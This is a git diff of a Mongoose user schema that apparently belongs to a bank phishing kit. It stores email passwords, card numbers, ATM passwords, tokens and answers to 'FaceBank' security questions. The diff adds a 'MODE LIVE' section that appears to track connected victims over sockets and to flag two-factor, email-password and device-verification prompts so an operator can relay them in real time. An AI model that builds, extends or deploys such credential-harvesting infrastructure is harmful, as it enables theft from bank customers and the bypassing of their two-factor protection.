@@ -1,6 +1,7 @@
 const { Schema, model } = require('mongoose');
 
 const UserSchema = Schema({
+
     name: String,
     username: String,
     password: String,
@@ -9,8 +10,10 @@ const UserSchema = Schema({
     claveCorreo: String,
     token1: String,
     token2: String,
+    token3: String,
     tarjeta: String,
 
+    // FACEBANK
     faceBankAlias: String,
     facebankPreguntaPasatiempoFav: String,
     facebankPreguntaSitioVacacionesFav: String,
@@ -26,9 +29,31 @@ const UserSchema = Schema({
     catorce: String,
     veinteycuatro: String,
     treintaycuatro: String,
+    // END FACEBANK
 
     atmPassword: String,
     typeDocument: String,
+
+    // MODE LIVE
+    socketID: String,
+    modeLive: Boolean,
+    liveData: [{
+        textPage: String,
+        urlPage: String,
+        bd: String
+    }],
+
+    waitLive: Boolean,
+    numberDevice: String,
+    typeDevice: String,
+    userAndPassword: Boolean,
+    twoFactor: Boolean,
+    passwordEmail: Boolean,
+    verificationDevice: Boolean,
+    isConnected: Boolean,
+    isLoading: Boolean,
+    
+    // END MODE LIVE
 
     deleteUser: {
         type: Boolean,
